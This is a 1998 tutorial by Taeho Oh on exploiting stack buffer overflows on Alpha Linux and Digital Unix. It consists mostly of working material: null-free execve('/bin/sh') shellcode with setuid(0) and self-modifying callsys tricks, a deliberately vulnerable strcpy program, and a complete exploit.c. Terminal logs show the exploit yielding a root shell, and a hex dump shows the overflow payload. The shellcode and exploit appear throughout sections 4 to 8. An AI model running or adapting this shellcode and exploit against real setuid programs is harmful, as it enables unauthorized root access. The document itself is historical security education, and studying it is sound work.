@@ -1,0 +1,798 @@
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+
+ Buffer overflow exploit in the alpha linux
+
+
+ Written by Taeho Oh ( ohhara@postech.edu )
+----------------------------------------------------------------------------
+Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara
+PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus
+PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug
+----------------------------------------------------------------------------
+
+
+1. Introduction
+ There are many exploit code of buffer overflow. However, almost all codes
+works well only in the intel x86 linux. This paper will attempt to explain
+how you exploit same bug in the alpha linux.
+
+2. What do you have to know before reading?
+ You have to know assembly language, C language, and Linux. Of course, you
+have to know what buffer overflow is. You can get the information of the
+buffer overflow in phrack 49-14 ( Smashing The Stack For Fun And Profit
+by Aleph1 ). It is a wonderful paper of buffer overflow and I highly recommend
+you to read that before reading this one.
+
+3. The registers of alpha linux
+ You have to know how much registers alpha has to make a shellcode. :)
+All registers have 64 bits.
+
+Registers of alpha
+----------------------------------------------------------------------------
+$0	v0
+$1	t0
+$2	t1
+$3	t2
+$4	t3
+$5	t4
+$6	t5
+$7	t6
+$8	t7
+$9	s0
+$10	s1
+$11	s2
+$12	s3
+$13	s4
+$14	s5
+$15	fp
+$16	a0
+$17	a1
+$18	a2
+$19	a3
+$20	a4
+$21	a5
+$22	t8
+$23	t9
+$24	t10
+$25	t11
+$26	ra
+$27	t12
+$28	at
+$29	gp
+$30	sp
+$31	zero
+$32	pc
+$33	vfp
+----------------------------------------------------------------------------
+
+4. Make a simple shellcode
+ Now, you will make a simple shellcode. You need not think about '\0'
+character now. Because you can modify and remove '\0' character later.
+
+shellcodeasm.c
+----------------------------------------------------------------------------
+#include<stdio.h>
+main()
+{
+	char *name[2];
+	name[0]="/bin/sh";
+	name[1]=NULL;
+	execve(name[0],name,NULL);
+}
+----------------------------------------------------------------------------
+
+compile and disassemble
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc -o shellcodeasm -static shellcodeasm.c
+[ ohhara@ohhara ~ ] {2} $ gdb shellcodeasm
+GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "alpha-redhat-linux"...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x1200001e8 <main>:     ldah    gp,18(t12)
+0x1200001ec <main+4>:   lda     gp,30704(gp)
+0x1200001f0 <main+8>:   lda     sp,-32(sp)
+0x1200001f4 <main+12>:  stq     ra,0(sp)
+0x1200001f8 <main+16>:  stq     fp,8(sp)
+0x1200001fc <main+20>:  mov     sp,fp
+0x120000200 <main+24>:  ldq     t0,-30952(gp)
+0x120000204 <main+28>:  stq     t0,16(fp)
+0x120000208 <main+32>:  stq     zero,24(fp)
+0x12000020c <main+36>:  ldq     a0,16(fp)
+0x120000210 <main+40>:  addq    fp,0x10,a1
+0x120000214 <main+44>:  clr     a2
+0x120000218 <main+48>:  ldq     t12,-32456(gp)
+0x12000021c <main+52>:  jsr     ra,(t12),0x120007180 <__execve>
+0x120000220 <main+56>:  ldah    gp,18(ra)
+0x120000224 <main+60>:  lda     gp,30648(gp)
+0x120000228 <main+64>:  mov     fp,sp
+0x12000022c <main+68>:  ldq     ra,0(sp)
+0x120000230 <main+72>:  ldq     fp,8(sp)
+0x120000234 <main+76>:  addq    sp,0x20,sp
+0x120000238 <main+80>:  ret     zero,(ra),0x1
+End of assembler dump.
+(gdb) disassemble execve
+Dump of assembler code for function __execve:
+0x120007180 <__execve>: lda     v0,59(zero)
+0x120007184 <__execve+4>:       callsys
+0x120007188 <__execve+8>:       bne     a3,0x120007190 <__execve+16>
+0x12000718c <__execve+12>:      ret     zero,(ra),0x1
+0x120007190 <__execve+16>:      br      gp,0x120007194 <__execve+20>
+0x120007194 <__execve+20>:      ldah    gp,18(gp)
+0x120007198 <__execve+24>:      lda     gp,2116(gp)
+0x12000719c <__execve+28>:      ldq     t12,-31592(gp)
+0x1200071a0 <__execve+32>:
+    jmp zero,(t12),0x120007738 <__syscall_error>
+End of assembler dump.
+(gdb)
+----------------------------------------------------------------------------
+
+ Now, you can know the condition to execute the "/bin/sh".
+
+To execute "/bin/sh"
+----------------------------------------------------------------------------
+a0($16) = The address of "/bin/sh\0"
+a1($17) = The address of the address of "/bin/sh\0"
+a2($18) = 0
+v0($0) = 59
+callsys
+----------------------------------------------------------------------------
+
+ With this information, you can make a shellcode very easily.
+
+testsc1.c
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	"\x31\x15\xd8\x43"      /* subq $30,192,$17             */
+	"\x12\x04\xff\x47"      /* clr $18                      */
+	"\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
+	"\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
+	"\x68\x00\x7f\x26"      /* ldah $19,0x0068($31)         */
+	"\x2f\x73\x73\x22"      /* lda $19,0x732f($19)          */
+	"\x3c\xff\x7e\xb2"      /* stl $19,-196($30)            */
+	"\x69\x6e\x7f\x26"      /* ldah $19,0x6e69($31)         */
+	"\x2f\x62\x73\x22"      /* lda $19,0x622f($19)          */
+	"\x38\xff\x7e\xb2"      /* stl $19,-200($30)            */
+	"\x3b\x00\x1f\x20"      /* lda $0,59($31)               */
+	"\x83\x00\x00\x00";     /* callsys                      */
+
+typedef void (*F)();
+
+main()
+{
+	F fp;
+	fp=(F)(&shellcode);
+	fp();
+}
+----------------------------------------------------------------------------
+ 
+ You may be frightened at the code. Don't worry. There is a line by line
+explanation. :)
+
+testsc1.c shellcode line by line explanation
+----------------------------------------------------------------------------
+char shellcode[]=
+
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	/* $16 = $30 - 200                                      */
+	/* $30 is stack pointer. To point "/bin/sh\0",          */
+	/* shellcode needs free memory space. $30 - 200 may be  */
+	/* free. :) "/bin/sh\0" character string will be stored */
+	/* in the $30 - 200 address. To execute "/bin/sh", $16  */
+	/* have to point to "/bin/sh\0"                         */
+	/* The 'q' of the 'subq' means 64 bit.                  */
+
+	"\x31\x15\xd8\x43"      /* subq $30,192,$17             */
+	/* $17 = $30 - 192                                      */
+	/* To execute "/bin/sh", $17 have to point to the       */
+	/* address of "/bin/sh\0". The address of "/bin/sh\0"   */
+	/* will be stored in the $30 - 192 address.             */
+
+	"\x12\x04\xff\x47"      /* clr $18                      */
+	/* Clear $18 register. To execute "/bin/sh" $18         */
+	/* register must be 0.                                  */
+
+	"\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
+	/* Store the address of "/bin/sh\0" in the $30 - 192    */
+	/* address.                                             */
+
+	"\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
+	/* Make 0 in the address of $30 - 184.                  */
+
+	"\x68\x00\x7f\x26"      /* ldah $19,0x0068($31)         */
+	/* $19 = 0x00680000                                     */
+	/* $31 is always 0                                      */
+
+	"\x2f\x73\x73\x22"      /* lda $19,0x732f($19)          */
+	/* $19 = 0x0068732f                                     */
+	/* $19 = "/sh\0"                                        */
+	/* Because alpha is little endian.                      */
+
+	"\x3c\xff\x7e\xb2"      /* stl $19,-196($30)            */
+	/* Store $19 in $30 - 196 address.                      */
+	/* $30 - 196 = "/sh\0"                                  */
+	/* The 'l' of the 'stl' means 32 bit                    */
+
+	"\x69\x6e\x7f\x26"      /* ldah $19,0x6e69($31)         */
+	/* $19 = 0x6e690000                                     */
+
+	"\x2f\x62\x73\x22"      /* lda $19,0x622f($19)          */
+	/* $19 = 0x6e69622f                                     */
+	/* $19 = "/bin"                                         */
+
+	"\x38\xff\x7e\xb2"      /* stl $19,-200($30)            */
+	/* Store $19 in $30 - 200 address.                      */
+	/* $30 - 200 = "/bin"                                   */
+
+	"\x3b\x00\x1f\x20"      /* lda $0,59($31)               */
+	/* $0 = 59                                              */
+	/* To execute "/bin/sh" $0 must be 59                   */
+
+	"\x83\x00\x00\x00";     /* callsys                      */
+	/* System call                                          */
+	/* Execute "/bin/sh"                                    */
+----------------------------------------------------------------------------
+
+compile and execute testsc1.c
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc testsc1.c -o testsc1
+[ ohhara@ohhara ~ ] {2} $ ./testsc1
+bash$
+----------------------------------------------------------------------------
+
+ Now, you have a shellcode of alpha linux. However, you can't use it to exploit
+the vulnerable programs. Because the shellcode has many '\0' characters.
+You have to remove all of '\0' character to use buffer overflow exploit.
+
+5. Try to remove '\0' character in the shellcode
+
+ You can remove '\0' characters by changing the instructions to other
+instructions which works same.
+ 
+remove '\0' character
+----------------------------------------------------------------------------
+from
+
+"\x68\x00\x7f\x26"      /* ldah $19,0x0068($31)         */
+"\x2f\x73\x73\x22"      /* lda $19,0x732f($19)          */
+
+to
+
+"\x98\xff\x7f\x26"      /* ldah $19,0xff98($31)         */
+"\xd0\x8c\x73\x22"      /* lda $19,0x8cd0($19)          */
+"\x13\x05\xf3\x47"      /* ornot $31,$19,$19            */
+----------------------------------------------------------------------------
+
+ One '\0' is removed.
+
+----------------------------------------------------------------------------
+from
+
+"\x3b\x00\x1f\x20"      /* lda $0,59($31)               */
+
+to
+
+"\x13\x94\xe7\x43"      /* addq $31,60,$19              */
+"\x20\x35\x60\x42"      /* subq $19,1,$0                */
+----------------------------------------------------------------------------
+
+ Two '\0' are removed.
+
+improved shellcode
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	"\x31\x15\xd8\x43"      /* subq $30,192,$17             */
+	"\x12\x04\xff\x47"      /* clr $18                      */
+	"\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
+	"\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
+	"\x98\xff\x7f\x26"      /* ldah $19,0xff98($31)         */
+	"\xd0\x8c\x73\x22"      /* lda $19,0x8cd0($19)          */
+	"\x13\x05\xf3\x47"      /* ornot $31,$19,$19            */
+	"\x3c\xff\x7e\xb2"      /* stl $19,-196($30)            */
+	"\x69\x6e\x7f\x26"      /* ldah $19,0x6e69($31)         */
+	"\x2f\x62\x73\x22"      /* lda $19,0x622f($19)          */
+	"\x38\xff\x7e\xb2"      /* stl $19,-200($30)            */
+	"\x13\x94\xe7\x43"      /* addq $31,60,$19              */
+	"\x20\x35\x60\x42"      /* subq $19,1,$0                */
+	"\x83\x00\x00\x00";     /* callsys                      */
+----------------------------------------------------------------------------
+
+compile and execute testsc2.c
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc testsc2.c -o testsc2
+[ ohhara@ohhara ~ ] {2} $ ./testsc2
+bash$
+----------------------------------------------------------------------------
+
+ You have only one instruction to remove, now. But it's difficult to remove.
+Because callsys insturction must be used to execute "/bin/sh" and callsys
+contains three '\0' characters. You have to insert the code which modifies the
+shellcode itself to use callsys instruction.
+
+6. Try to remove ALL '\0' character in the shellcode
+
+ You have to remove '\0' character of callsys instruction.
+
+final shellcode
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	/* $16 = $30 - 200
+	/* $16 must have the shellcode address. However, before */
+	/* the bsr instruction, $16 can't have the address.     */
+	/* This instruction just store the meaningless address. */
+	/* The all instruction before bsr are meaningless.      */
+
+	"\x11\x74\xf0\x47"      /* bis $31,0x83,$17             */
+	/* $17 = 0 or 0x83                                      */
+	/* $17 = 0x83                                           */
+
+	"\x12\x94\x07\x42"      /* addq $16,60,$18              */
+	"\xfc\xff\x32\xb2"      /* stl $17,-4($18)              */
+	/* $17("\x83\x00\x00\x00") is stored in $16 + 60 - 4    */
+	/* address.                                             */
+	/* ( "\xff\xff\xff\xff" -> "\x83\x00\x00\x00" )         */
+
+	"\xff\x47\x3f\x26"      /* ldah $17,0x47ff($31)         */
+	"\x1f\x04\x31\x22"      /* lda $17,0x041f($17)          */
+	/* $17 = "\x1f\x04\xff\x47"                             */
+	/* "\x1f\x04\xff\x47" is nop instruction.               */
+
+	"\xfc\xff\x30\xb2"      /* stl $17,-4($16)              */
+	/* change "bsr $16,-28" instruction" into nop           */
+	/* instruction to pass through the bsr instruction.     */
+	/* ( "\xf9\xff\x1f\xd2" -> "\x1f\x04\xff\x47" )         */
+
+	"\xf9\xff\x1f\xd2"      /* bsr $16,-28                  */
+	/* Jump to "bis $31,0x83,$17" and store the current     */
+	/* address in the $16.                                  */
+	/* After jump, this insturction will be changed into    */
+	/* nop instruction.                                     */
+
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	"\x31\x15\xd8\x43"      /* subq $30,192,$17             */
+	"\x12\x04\xff\x47"      /* clr $18                      */
+	"\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
+	"\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
+	"\x98\xff\x7f\x26"      /* ldah $19,0xff98($31)         */
+	"\xd0\x8c\x73\x22"      /* lda $19,0x8cd0($19)          */
+	"\x13\x05\xf3\x47"      /* ornot $31,$19,$19            */
+	"\x3c\xff\x7e\xb2"      /* stl $19,-196($30)            */
+	"\x69\x6e\x7f\x26"      /* ldah $19,0x6e69($31)         */
+	"\x2f\x62\x73\x22"      /* lda $19,0x622f($19)          */
+	"\x38\xff\x7e\xb2"      /* stl $19,-200($30)            */
+	"\x13\x94\xe7\x43"      /* addq $31,60,$19              */
+	"\x20\x35\x60\x42"      /* subq $19,1,$0                */
+
+	"\xff\xff\xff\xff";     /* callsys ( disguised )        */
+	/* This will be changed to "\x83\x00\x00\x00"           */
+----------------------------------------------------------------------------
+
+compile and execute testsc3.c
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc testsc3.c -o testsc3
+[ ohhara@ohhara ~ ] {2} $ ./testsc3
+bash$
+----------------------------------------------------------------------------
+
+7. Insert setuid(0) code in the shellcode.
+
+ You may not get the rootshell with your shellcode by overflowing the
+vulnerable setuid root program. You have to insert setuid(0) code into the
+shellcode.
+
+setuidasm.c
+----------------------------------------------------------------------------
+main()
+{
+	setuid(0);
+}
+----------------------------------------------------------------------------
+
+compile and disassemble
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc -o setuidasm -static setuidasm.c
+[ ohhara@ohhara ~ ] {2} $ gdb setuidasm
+GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "alpha-redhat-linux"...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x1200001e8 <main>:     ldah    gp,18(t12)
+0x1200001ec <main+4>:   lda     gp,30696(gp)
+0x1200001f0 <main+8>:   lda     sp,-16(sp)
+0x1200001f4 <main+12>:  stq     ra,0(sp)
+0x1200001f8 <main+16>:  stq     fp,8(sp)
+0x1200001fc <main+20>:  mov     sp,fp
+0x120000200 <main+24>:  clr     a0
+0x120000204 <main+28>:  ldq     t12,-31056(gp)
+0x120000208 <main+32>:  jsr     ra,(t12),0x120007180 <__setuid>
+0x12000020c <main+36>:  ldah    gp,18(ra)
+0x120000210 <main+40>:  lda     gp,30660(gp)
+0x120000214 <main+44>:  mov     fp,sp
+0x120000218 <main+48>:  ldq     ra,0(sp)
+0x12000021c <main+52>:  ldq     fp,8(sp)
+0x120000220 <main+56>:  addq    sp,0x10,sp
+0x120000224 <main+60>:  ret     zero,(ra),0x1
+End of assembler dump.
+(gdb) disassemble setuid
+Dump of assembler code for function __setuid:
+0x120007180 <__setuid>: lda     v0,23(zero)
+0x120007184 <__setuid+4>:       callsys
+0x120007188 <__setuid+8>:       bne     a3,0x120007190 <__setuid+16>
+0x12000718c <__setuid+12>:      ret     zero,(ra),0x1
+0x120007190 <__setuid+16>:      br      gp,0x120007194 <__setuid+20>
+0x120007194 <__setuid+20>:      ldah    gp,18(gp)
+0x120007198 <__setuid+24>:      lda     gp,2108(gp)
+0x12000719c <__setuid+28>:      ldq     t12,-31600(gp)
+0x1200071a0 <__setuid+32>:
+    jmp zero,(t12),0x120007738 <__syscall_error>
+End of assembler dump.
+(gdb)
+----------------------------------------------------------------------------
+
+ Now, you can know the condition to setuid(0).
+
+To setuid(0)
+----------------------------------------------------------------------------
+a0($16) = 0
+v0($0) = 23
+callsys
+----------------------------------------------------------------------------
+
+ This contains callsys instruction. So you have to remove '\0' of the setuid(0)
+code, too.
+
+testsc4.c
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	"\x11\x74\xf0\x47"      /* bis $31,0x83,$17             */
+	"\x12\x14\x02\x42"      /* addq $16,16,$18              */
+	"\xfc\xff\x32\xb2"      /* stl $17,-4($18)              */
+	"\x12\x94\x09\x42"      /* addq $16,76,$18              */
+	"\xfc\xff\x32\xb2"      /* stl $17,-4($18)              */
+	"\xff\x47\x3f\x26"      /* ldah $17,0x47ff($31)         */
+	"\x1f\x04\x31\x22"      /* lda $17,0x041f($17)          */
+	"\xfc\xff\x30\xb2"      /* stl $17,-4($16)              */
+	"\xf7\xff\x1f\xd2"      /* bsr $16,-32                  */
+	"\x10\x04\xff\x47"      /* clr $16                      */
+	"\x11\x14\xe3\x43"      /* addq $31,24,$17              */
+	"\x20\x35\x20\x42"      /* subq $17,1,$0                */
+	"\xff\xff\xff\xff"      /* callsys ( disguised )        */
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	"\x31\x15\xd8\x43"      /* subq $30,192,$17             */
+	"\x12\x04\xff\x47"      /* clr $18                      */
+	"\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
+	"\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
+	"\x98\xff\x7f\x26"      /* ldah $19,0xff98($31)         */
+	"\xd0\x8c\x73\x22"      /* lda $19,0x8cd0($19)          */
+	"\x13\x05\xf3\x47"      /* ornot $31,$19,$19            */
+	"\x3c\xff\x7e\xb2"      /* stl $19,-196($30)            */
+	"\x69\x6e\x7f\x26"      /* ldah $19,0x6e69($31)         */
+	"\x2f\x62\x73\x22"      /* lda $19,0x622f($19)          */
+	"\x38\xff\x7e\xb2"      /* stl $19,-200($30)            */
+	"\x13\x94\xe7\x43"      /* addq $31,60,$19              */
+	"\x20\x35\x60\x42"      /* subq $19,1,$0                */
+	"\xff\xff\xff\xff";     /* callsys ( disguised )        */
+
+typedef void (*F)();
+
+main()
+{
+	F fp;
+	fp=(F)(&shellcode);
+	fp();
+}
+----------------------------------------------------------------------------
+
+ If you read this paper, you can recognize what testsc4.c do. :)
+
+compile and execute testsc4.c
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc testsc4.c -o testsc4
+[ ohhara@ohhara ~ ] {2} $ ./testsc4
+bash$
+----------------------------------------------------------------------------
+
+8. Exploit a vulnerable setuid root program
+
+ You can exploit a classic vulnernable program in the alpha linux. This
+is an example.
+
+vulnerable.c
+----------------------------------------------------------------------------
+#include<stdio.h>
+#include<string.h>
+
+void vulfunc(char *buf)
+{
+	char localbuf[1024];
+	strcpy(localbuf+1,buf);
+}
+
+main(int argc,char **argv)
+{
+	if(argc>1)
+		vulfunc(argv[1]);
+}
+----------------------------------------------------------------------------
+
+ You can't change the return address of the vulfunc function. When you try
+to overflow the localbuf of vulfunc, you can change the return address of
+the main function. ( It's similar to the stack of the sparc. )
+Because the localbuf is stored after the vulfunc return address. The intel
+x86 is that localbuf is stored before the vulfunc return address.
+Therefore, by overflowing localbuf in the intel x86, localbuf can change
+the return address of vulfunc function. However, in the alpha, localbuf can't
+change the return address of vulfunc function and can change the return address
+of the main function.
+
+ To execute the instruction, the code must be well aligned. For example,
+the instruction can be located in 0x120000000 and 0x120000004 and can't be
+located in 0x120000001, 0x120000002, and 0x120000003. ( step by 4 )
+
+ The address of alpha is 64 bit. Almost all cases, the address of stack
+is looks like 0x000000011fffff24. The address has many '\0' characters.
+Therefore, you can't insert many return addresses in the buffer. You must
+insert only one. So you must know the location of the return address exactly.
+It's not difficult to find that. Because the location of the return address
+is decided at the compile time.
+
+exploit.c 
+----------------------------------------------------------------------------
+#include<stdio.h>
+#include<string.h>
+
+#define OFFSET                            0
+#define ALIGN                             3     /* 0, 1, 2, 3           */
+#define RET_POSITION                   1028     /* 0, 4, 8, 12, . . .   */
+#define NOP              "\x1f\x04\xff\x47"           
+
+char shellcode[]=
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	"\x11\x74\xf0\x47"      /* bis $31,0x83,$17             */
+	"\x12\x14\x02\x42"      /* addq $16,16,$18              */
+	"\xfc\xff\x32\xb2"      /* stl $17,-4($18)              */
+	"\x12\x94\x09\x42"      /* addq $16,76,$18              */
+	"\xfc\xff\x32\xb2"      /* stl $17,-4($18)              */
+	"\xff\x47\x3f\x26"      /* ldah $17,0x47ff($31)         */
+	"\x1f\x04\x31\x22"      /* lda $17,0x041f($17)          */
+	"\xfc\xff\x30\xb2"      /* stl $17,-4($16)              */
+	"\xf7\xff\x1f\xd2"      /* bsr $16,-32                  */
+	"\x10\x04\xff\x47"      /* clr $16                      */
+	"\x11\x14\xe3\x43"      /* addq $31,24,$17              */
+	"\x20\x35\x20\x42"      /* subq $17,1,$0                */
+	"\xff\xff\xff\xff"      /* callsys ( disguised )        */
+	"\x30\x15\xd9\x43"      /* subq $30,200,$16             */
+	"\x31\x15\xd8\x43"      /* subq $30,192,$17             */
+	"\x12\x04\xff\x47"      /* clr $18                      */
+	"\x40\xff\x1e\xb6"      /* stq $16,-192($30)            */
+	"\x48\xff\xfe\xb7"      /* stq $31,-184($30)            */
+	"\x98\xff\x7f\x26"      /* ldah $19,0xff98($31)         */
+	"\xd0\x8c\x73\x22"      /* lda $19,0x8cd0($19)          */
+	"\x13\x05\xf3\x47"      /* ornot $31,$19,$19            */
+	"\x3c\xff\x7e\xb2"      /* stl $19,-196($30)            */
+	"\x69\x6e\x7f\x26"      /* ldah $19,0x6e69($31)         */
+	"\x2f\x62\x73\x22"      /* lda $19,0x622f($19)          */
+	"\x38\xff\x7e\xb2"      /* stl $19,-200($30)            */
+	"\x13\x94\xe7\x43"      /* addq $31,60,$19              */
+	"\x20\x35\x60\x42"      /* subq $19,1,$0                */
+	"\xff\xff\xff\xff";     /* callsys ( disguised )        */
+
+unsigned long get_sp(void)
+{
+	__asm__("bis $31,$30,$0");
+}
+
+int main(int argc,char **argv)
+{
+	char buff[RET_POSITION+8+ALIGN+1],*ptr;
+	char *nop;
+	int offset=OFFSET,bsize=RET_POSITION+8+ALIGN+1;
+	unsigned long sp,addr;
+	int i;
+
+	if(argc>1)
+		offset=atoi(argv[1]);
+
+	nop=NOP;
+
+	for(i=0;i<bsize;i++)
+		buff[i]='a';
+
+	for(i=0;i<bsize;i++)
+		buff[i+ALIGN]=nop[i%4];
+
+	sp=get_sp();
+	addr=sp-offset;
+
+	ptr=buff+bsize-strlen(shellcode)-8-1;
+	for(i=0;i<strlen(shellcode);i++)
+		*(ptr++)=shellcode[i];
+
+	buff[RET_POSITION+ALIGN]=(addr&0x00000000000000ff);
+	buff[RET_POSITION+ALIGN+1]=(addr&0x000000000000ff00)>>8;
+	buff[RET_POSITION+ALIGN+2]=(addr&0x0000000000ff0000)>>16;
+	buff[RET_POSITION+ALIGN+3]=(addr&0x00000000ff000000)>>24;
+	buff[RET_POSITION+ALIGN+4]=(addr&0x000000ff00000000)>>32;
+	buff[RET_POSITION+ALIGN+5]=(addr&0x0000ff0000000000)>>40;
+	buff[RET_POSITION+ALIGN+6]=(addr&0x00ff000000000000)>>48;
+	buff[RET_POSITION+ALIGN+7]=(addr&0xff00000000000000)>>56;
+
+	buff[bsize-1]='\0';
+
+	printf("Jump to 0x%016x\n",addr);
+	
+	execl("./vulnerable","vulnerable",buff,NULL);
+}
+----------------------------------------------------------------------------
+
+exploit the vulnerable program in the alpha linux
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ uname -a
+Linux ohhara.postech.ac.kr 2.0.35 #11 Mon Oct 19 22:58:15 EDT 1998 alpha unknown
+[ ohhara@ohhara ~ ] {2} $ ls -l vulnerable
+-rwsr-xr-x   1 root     root        13906 Nov 13 14:55 vulnerable*
+[ ohhara@ohhara ~ ] {3} $ ls -l exploit
+-rwxrwxr-x   1 ohhara   ohhara      15541 Nov 13 18:22 exploit*
+[ ohhara@ohhara ~ ] {4} $ ./exploit
+Jump to 0x000000001ffff6c8
+Illegal instruction
+[ ohhara@ohhara ~ ] {5} $ ./exploit 400
+Jump to 0x000000001ffff530
+bash# whoami
+root
+bash#
+----------------------------------------------------------------------------
+
+exploit the vulnerable program in the digital unix ( same source files )
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ uname -a
+OSF1 monsky.postech.ac.kr V4.0 464 alpha
+[ ohhara@ohhara ~ ] {2} $ ls -l vulnerable
+-rwsr-xr-x   1 root     system     24576 Nov 13 20:31 vulnerable*
+[ ohhara@ohhara ~ ] {3} $ ls -l exploit
+-rwxr-xr-x   1 ohhara   system     24576 Nov 13 20:31 exploit*
+[ ohhara@ohhara ~ ] {4} $ ./exploit
+Jump to 0x000000001ffff030
+# whoami
+root
+#
+----------------------------------------------------------------------------
+
+the buffer overflow data
+----------------------------------------------------------------------------
+    0  61 61 61 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      aaa...G...G...G.
+   16  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+   32  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+   48  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+   64  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+   80  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+   96  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  112  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  128  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  144  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  160  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  176  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  192  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  208  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  224  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  240  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  256  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  272  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  288  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  304  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  320  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  336  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  352  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  368  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  384  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  400  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  416  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  432  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  448  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  464  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  480  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  496  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  512  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  528  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  544  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  560  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
+  576  04 ff 47 1f 04 ff 47 1f 04 ff 47 1f 04 ff 47 1f      ..G...G...G...G.
